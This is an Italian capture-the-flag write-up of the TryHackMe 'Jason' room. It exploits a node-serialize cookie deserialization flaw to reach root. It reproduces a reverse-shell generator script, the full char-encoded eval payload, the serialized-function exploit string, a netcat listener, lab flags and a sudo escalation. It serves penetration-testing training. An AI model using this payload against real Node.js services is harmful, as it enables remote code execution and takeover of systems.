
#laboratorio #tryhackmelabs 

https://tryhackme.com/room/jason

**Siamo Horror LLC,** specializzati in horror, ma uno degli aspetti più spaventosi della nostra azienda è il nostro web server front-end. Non possiamo lanciare il nostro sito allo stato attuale e la nostra preoccupazione per la sicurezza informatica sta crescendo esponenzialmente. Vi chiediamo di eseguire un penetration test approfondito e di provare a compromettere l'account di root. Non ci sono regole per questo tipo di interazione. Buona fortuna!

```
nmap -sN -O -v -p- 10.10.207.241
```
```
PORT   STATE         SERVICE
22/tcp open|filtered ssh
80/tcp open|filtered http

```

```
nmap -sVC -p22,80 10.10.207.241
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:a2:a4:49:1d:20:52:9f:56:55:81:be:e9:e6:05:e3 (RSA)
|   256 2a:f9:f2:53:92:d0:59:7b:d6:79:56:fe:5b:b6:45:cd (ECDSA)
|_  256 8d:8f:79:95:42:2a:2d:41:af:f0:5d:b9:b4:a5:46:65 (ED25519)
80/tcp open  http
|_http-title: Horror LLC
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Tue, 20 May 2025 16:11:00 GMT
|     Connection: close
|     <html><head>
|     <title>Horror LLC</title>
|     <style>
|     body {
|     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);

```

enumeriamo 

```
gobuster dir -u http://10.10.207.241:80/ -w /usr/share/wordlists/dirb/common.txt -t50 -k -b "200"
```

```
dirb http://10.10.207.241:80/ /usr/share/wordlists/dirb/common.txt
```

```
whatweb http://10.10.207.241/
```
non otteniamo granchè

vediamo cosa cè su
```
http://10.10.207.241/
```
il sito è creato con nodejs

analizziamo il sorgente della pagina
```
</style>
</head>
<body>
	<div class="full-screen">
  <div>
    <h1>Horror LLC</h1>
    <h4>Built with Nodejs</h4>
    <br>
    <h3>We'll keep you updated at: ' ofdg</h3>
    <br>
    <h2>Email address:</h2>
    <input type="text" id="fname" name="fname"><br><br>
    <a class="button-line" id="signup">Submit</a> 
    <script>
    document.getElementById("signup").addEventListener("click", function() {
	var date = new Date();
    	date.setTime(date.getTime()+(-1*24*60*60*1000));
    	var expires = "; expires="+date.toGMTString();
    	document.cookie = "session=foobar"+expires+"; path=/";
    	const Http = new XMLHttpRequest();
        console.log(location);
        const url=window.location.href+"?email="+document.getElementById("fname").value;
        Http.open("POST", url);
        Http.send();
	setTimeout(function() {
		window.location.reload();
	}, 500);
    }); 
    </script>
  </div>
</div>

</body></html>
```

proviamo XSS
```
<script>alert('Succ3ssful XSS');</script>
```
ma nulla di utile

Catturiamo la richiesta con Burp
```
POST /?email=test@test.com HTTP/1.1
Host: 10.10.207.241
User-Agent: J
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://10.10.207.241
Connection: keep-alive
Referer: http://10.10.207.241/
Content-Length: 0
```
analizziamop lo script della risposta
```
   <script>
    document.getElementById("signup").addEventListener("click", function() {
	var date = new Date();
    	date.setTime(date.getTime()+(-1*24*60*60*1000));
    	var expires = "; expires="+date.toGMTString();
    	document.cookie = "session=foobar"+expires+"; path=/";
    	const Http = new XMLHttpRequest();
        console.log(location);
        const url=window.location.href+"?email="+document.getElementById("fname").value;
        Http.open("POST", url);
        Http.send();
	setTimeout(function() {
		window.location.reload();
	}, 500);
    }); 
    </script>
```
**Funzionalità JavaScript**

Il codice JavaScript è progettato per gestire l'interazione dell'utente con il pulsante "Invia". Ecco come funziona in dettaglio:

1. **Ascoltatore di Eventi**:
    
    - La riga `document.getElementById("signup").addEventListener("click", function() {...});` imposta un ascoltatore di eventi sul pulsante con l'ID "signup". Questo significa che quando l'utente clicca su questo pulsante, viene eseguita la funzione definita all'interno delle parentesi.
2. **Impostazione della Data di Scadenza del Cookie**:
    
    - All'interno della funzione, viene creata una nuova data con `var date = new Date();`.
    - La riga `date.setTime(date.getTime()+(-1*24*60*60*1000));` imposta la data di scadenza del cookie a un giorno prima dell'attuale. Questo è fatto sottraendo 24 ore (in millisecondi) dalla data attuale. Tuttavia, sembra che ci sia un errore logico qui, poiché il cookie dovrebbe avere una scadenza futura, non passata.
3. **Creazione del Cookie**:
    
    - La riga `var expires = "; expires="+date.toGMTString();` crea una stringa che rappresenta la data di scadenza del cookie in formato GMT.
    - La riga `document.cookie = "session=foobar"+expires+"; path=/";` imposta un cookie chiamato `session` con il valore `foobar`, utilizzando la data di scadenza appena creata. Il cookie è accessibile su tutto il sito (`path=/`).
4. **Invio della Richiesta al Server**:
    
    - Viene creato un oggetto `XMLHttpRequest` con `const Http = new XMLHttpRequest();`. Questo oggetto è utilizzato per inviare richieste HTTP al server.
    - La riga `const url=window.location.href+"?email="+document.getElementById("fname").value;` costruisce l'URL per la richiesta POST. Aggiunge l'indirizzo email inserito dall'utente (recuperato dal campo di input con ID "fname") come parametro di query all'URL corrente della pagina.
5. **Apertura e Invio della Richiesta**:
    
    - La riga `Http.open("POST", url);` apre una connessione al server per inviare una richiesta POST all'URL costruito.
    - La riga `Http.send();` invia effettivamente la richiesta al server.
6. **Ricaricamento della Pagina**:
    
    - Infine, viene utilizzata la funzione `setTimeout` per ricaricare la pagina dopo 500 millisecondi (0,5 secondi) con `setTimeout(function() { window.location.reload(); }, 500);`. Questo permette di aggiornare la pagina, probabilmente per riflettere eventuali cambiamenti o per resettare il modulo.

In sintesi, il codice JavaScript gestisce l'interazione dell'utente con il pulsante "Invia", raccoglie l'indirizzo email inserito, imposta un cookie di sessione e invia l'indirizzo email al server tramite una richiesta POST. Dopo un breve ritardo, la pagina si ricarica per mostrare eventuali aggiornamenti.

Quindi cosa succede qui? Il codice che gestisce la richiesta è disponibile nel codice sorgente della pagina, ma ci sono 4 passaggi fondamentali:

1. Una richiesta POST invia l'input dell'utente al server nel `?email=`parametro query
2. Il server risponde alla richiesta POST con un'intestazione SetCookie con un oggetto JSON codificato in base64 contenente l'input dell'utente
3. La pagina viene ricaricata (vedi `window.location.reload`nella fonte), effettuando una richiesta GET che invia il nuovo cookie al server
4. Il server risponde alla richiesta GET, aggiungendo il valore ricevuto nel cookie a "Ti terremo aggiornato su: VALUE"

Una ricerca su Google per "vulnerabilità JSON di nodejs" mostra un articolo su un [bug di deserializzazione JSON nel pacchetto npm "node-seralize".](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

La vulnerabilità nell'applicazione web risiede nel fatto che legge un cookie dalla richiesta HTTP, esegue la decodifica base64 del valore del cookie e lo passa alla funzione. Poiché il cookie è un input non attendibile, un aggressore può creare un valore di cookie dannoso per sfruttare questa vulnerabilità. Ho utilizzato  [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) per generare un payload di reverse shell. `unserialize()`

```
nano nodejsshell.py
```
```
#!/usr/bin/python
# Generator for encoded NodeJS reverse shells
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net
import sys

if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print "[+] LHOST = %s" % (IP_ADDR)
print "[+] LPORT = %s" % (PORT)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print "[+] Encoding"
PAYLOAD = charencode(NODEJS_REV_SHELL)
print "eval(String.fromCharCode(%s))" % (PAYLOAD)
```

```
./nodejsshell.py ATTACK-IP 4444
```

```
python2 nodejsshell.py 10.14.99.134 4444
```
```
[+] LHOST = 10.14.99.134
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,52,46,57,57,46,49,51,52,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```
Ora potremmo pensare di poter racchiudere questa reverse shell in un IIFE e copiarlo nel campo email dell'app web. Questo non funziona, e l'articolo spiega perché: il metodo unserialize() esegue le IIFE solo se le riconosce come funzioni serializzate dal metodo "serialize()" di node-serialize.
Rubiamo il flag usato da serialize() per indicare una funzione. 
Dopo aver aggiunto questo flag alla nostra reverse shell con IIFE, il nostro script di exploit dovrebbe apparire più o meno così:

```
_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,52,46,57,57,46,49,51,52,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()
```
Ci mettiamo in ascolto
```
nc -lnvp 4444
```
Copiamo il tutto nell'indirizzo mail inviamo ed otteniamo la reverse shell!
```
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.207.241] 50860
Connected!
ls
index.html
node_modules
package.json
package-lock.json
server.js
```

Il flag dell'utente è su `/home/dylan/user.txt`

```
cat /home/dylan/user.txt
```

```
cat /home/dylan/user.txt
0ba48780dee9f5677a4461f588af217c
```
user.txt
```
0ba48780dee9f5677a4461f588af217c
```

```
/bin/bash -i
```

```
sudo -l
```
```
sudo -l
Matching Defaults entries for ubuntu on ip-10-10-230-161:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ubuntu may run the following commands on ip-10-10-230-161:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

```
possiamo diventare root senza inserire la password
```
sudo su
```
```
whoami
root
ls
index.html
node_modules
package.json
package-lock.json
server.js
ls /root
root.txt
cat /root/root.txt
2cd5a9fd3a0024bfa98d01d69241760e
```

root.txt
```
2cd5axxxxxxxxxxxxxxxxxxxx
```